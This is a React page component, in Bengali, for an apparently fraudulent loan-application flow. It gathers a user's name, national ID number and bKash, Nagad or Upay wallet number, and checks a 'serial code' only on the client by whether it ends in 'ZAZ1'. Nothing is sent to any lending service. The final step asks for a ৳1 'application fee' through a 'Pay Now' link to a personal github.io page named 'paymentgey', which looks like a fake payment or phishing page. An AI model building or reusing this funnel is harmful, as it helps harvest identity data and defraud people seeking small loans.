import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useAuth } from "@/context/AuthContext";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { toast } from "sonner";
import { ArrowLeft } from "lucide-react";

const amounts = [3000, 5000, 10000, 20000];
const tenures = [
  { v: 3, l: "৩ মাস" },
  { v: 6, l: "৬ মাস" },
  { v: 12, l: "১ বছর" },
  { v: 24, l: "২ বছর" },
];
const methods = [
  { v: "nagad", l: "নগদ" },
  { v: "bkash", l: "বিকাশ" },
  { v: "upay", l: "উপায়" },
  { v: "app", l: "অ্যাপ ব্যালেন্স" },
];

const INTEREST_RATES: Record<number, number> = { 3: 5, 6: 10, 12: 15, 24: 20 };

export default function Loan() {
  const nav = useNavigate();
  const { user } = useAuth();
  const [step, setStep] = useState(1);
  const [name, setName] = useState(user?.name || "");
  const [nid, setNid] = useState("");
  const [amount, setAmount] = useState<number | null>(null);
  const [tenure, setTenure] = useState<number | null>(null);
  const [method, setMethod] = useState<string | null>(null);
  const [nagadNum, setNagadNum] = useState("");
  const [serial, setSerial] = useState("");

  const rate = tenure ? INTEREST_RATES[tenure] : 0;
  const interest = amount ? (amount * rate) / 100 : 0;
  const total = amount ? amount + interest : 0;

  const submitForm = (e: React.FormEvent) => {
    e.preventDefault();
    if (nid.length < 10) return toast.error("NID কমপক্ষে ১০ ডিজিট হতে হবে");
    if (!amount || !tenure || !method) return toast.error("সব তথ্য পূরণ করুন");
    setStep(2);
  };

  const proceedFromSummary = () => {
    if (method === "nagad" || method === "bkash" || method === "upay") setStep(3);
    else setStep(4);
  };

  const submitNagad = (e: React.FormEvent) => {
    e.preventDefault();
    const methodLabel = method === "bkash" ? "বিকাশ" : method === "upay" ? "উপায়" : "নগদ";
    if (nagadNum.length < 11) return toast.error(`সঠিক ${methodLabel} নাম্বার দিন`);
    setStep(4);
  };

  const submitSerial = (e: React.FormEvent) => {
    e.preventDefault();
    if (!serial.trim().toUpperCase().endsWith("ZAZ1")) {
      return toast.error("ভুল সিরিয়াল কোড");
    }
    toast.success("সিরিয়াল কোড সঠিক");
    setStep(5);
  };

  const card = "bg-card rounded-2xl p-5 shadow-[var(--shadow-card)]";

  return (
    <div className="min-h-screen bg-muted/30 pb-10">
      <div className="bg-[image:var(--gradient-header)] px-4 py-5 flex items-center gap-3 rounded-b-2xl">
        <button onClick={() => (step > 1 ? setStep(step - 1) : nav("/"))} className="text-primary-foreground">
          <ArrowLeft />
        </button>
        <h1 className="text-lg font-bold text-primary-foreground">লোন আবেদন</h1>
      </div>

      <div className="max-w-md mx-auto px-4 mt-5 space-y-4">
        {step === 1 && (
          <form onSubmit={submitForm} className={`${card} space-y-4`}>
            <div>
              <Label>নাম</Label>
              <Input value={name} onChange={(e) => setName(e.target.value)} required />
            </div>
            <div>
              <Label>NID নাম্বার (১০+ ডিজিট)</Label>
              <Input value={nid} onChange={(e) => setNid(e.target.value.replace(/\D/g, ""))} required />
            </div>
            <div>
              <Label>লোনের পরিমাণ</Label>
              <div className="grid grid-cols-2 gap-2 mt-2">
                {amounts.map((a) => (
                  <button type="button" key={a} onClick={() => setAmount(a)}
                    className={`py-2 rounded-lg border font-semibold ${amount === a ? "bg-primary border-primary" : "bg-card"}`}>
                    ৳{a.toLocaleString()}
                  </button>
                ))}
              </div>
            </div>
            <div>
              <Label>মেয়াদ</Label>
              <div className="grid grid-cols-2 gap-2 mt-2">
                {tenures.map((t) => (
                  <button type="button" key={t.v} onClick={() => setTenure(t.v)}
                    className={`py-2 rounded-lg border font-semibold ${tenure === t.v ? "bg-primary border-primary" : "bg-card"}`}>
                    {t.l}
                  </button>
                ))}
              </div>
            </div>
            <div>
              <Label>লোন নেওয়ার মাধ্যম</Label>
              <div className="grid grid-cols-2 gap-2 mt-2">
                {methods.map((m) => (
                  <button type="button" key={m.v} onClick={() => setMethod(m.v)}
                    className={`py-2 rounded-lg border font-semibold ${method === m.v ? "bg-primary border-primary" : "bg-card"}`}>
                    {m.l}
                  </button>
                ))}
              </div>
            </div>
            <Button type="submit" className="w-full bg-brand-blue text-brand-blue-foreground hover:bg-brand-blue/90">সাবমিট</Button>
          </form>
        )}

        {step === 2 && (
          <div className={card}>
            <h2 className="text-xl font-bold text-brand-blue mb-4">অ্যামাউন্ট বিস্তারিত</h2>
            <div className="space-y-3 text-sm">
              <Row k="লোনের পরিমাণ" v={`৳${amount!.toLocaleString()}.00`} />
              <Row k="ইন্টারেস্ট রেট" v={`${rate.toFixed(2)}%`} />
              <Row k="মোট ইন্টারেস্ট" v={`৳${interest.toLocaleString()}.00`} />
              <div className="border-t pt-3">
                <Row k="মোট পরিশোধযোগ্য" v={`৳${total.toLocaleString()}.00`} bold />
              </div>
              <Row k="মেয়াদ" v={tenures.find((t) => t.v === tenure)!.l} />
              <Row k="মাধ্যম" v={methods.find((m) => m.v === method)!.l} />
            </div>
            <Button onClick={proceedFromSummary} className="w-full mt-5 bg-brand-blue text-brand-blue-foreground hover:bg-brand-blue/90">এগিয়ে যান</Button>
          </div>
        )}

        {step === 3 && (
          <form onSubmit={submitNagad} className={`${card} space-y-4`}>
            <h2 className="text-lg font-bold text-brand-blue">{method === "bkash" ? "বিকাশ" : method === "upay" ? "উপায়" : "নগদ"} নাম্বার দিন</h2>
            <p className="text-sm text-muted-foreground">যে {method === "bkash" ? "বিকাশ" : method === "upay" ? "উপায়" : "নগদ"} নাম্বারে লোন নিতে চান</p>
            <Input placeholder="01XXXXXXXXX" value={nagadNum} onChange={(e) => setNagadNum(e.target.value.replace(/\D/g, ""))} required />
            <Button type="submit" className="w-full bg-brand-blue text-brand-blue-foreground hover:bg-brand-blue/90">সাবমিট</Button>
          </form>
        )}

        {step === 4 && (
          <form onSubmit={submitSerial} className={`${card} space-y-4`}>
            <h2 className="text-lg font-bold text-brand-blue">সিরিয়াল কোড দিন</h2>
            <p className="text-sm text-muted-foreground">আমাদের থেকে প্রাপ্ত সিরিয়াল কোড লিখুন</p>
            <Input placeholder="সিরিয়াল কোড" value={serial} onChange={(e) => setSerial(e.target.value)} required />
            <Button type="submit" className="w-full bg-brand-blue text-brand-blue-foreground hover:bg-brand-blue/90">সাবমিট</Button>
          </form>
        )}

        {step === 5 && (
          <div className={card}>
            <h2 className="text-xl font-bold text-brand-blue mb-3">আবেদন ফি</h2>
            <p className="text-sm text-muted-foreground mb-4">আপনার লোন আবেদন প্রক্রিয়া সম্পন্ন করতে একটি আবেদন ফি প্রদান করুন।</p>
            <div className="bg-secondary rounded-xl p-4 text-center mb-4">
              <p className="text-sm">আবেদন ফি</p>
              <p className="text-3xl font-extrabold text-brand-blue">৳1.00</p>
            </div>
            <Button onClick={() => window.open("https://xm1rahiyan104.github.io/paymentgey/", "_blank")}
              className="w-full bg-brand-blue text-brand-blue-foreground hover:bg-brand-blue/90">
              Pay Now
            </Button>
          </div>
        )}
      </div>
    </div>
  );
}

const Row = ({ k, v, bold }: { k: string; v: string; bold?: boolean }) => (
  <div className={`flex justify-between ${bold ? "font-bold text-base" : ""}`}>
    <span className="text-muted-foreground">{k}</span>
    <span>{v}</span>
  </div>
);
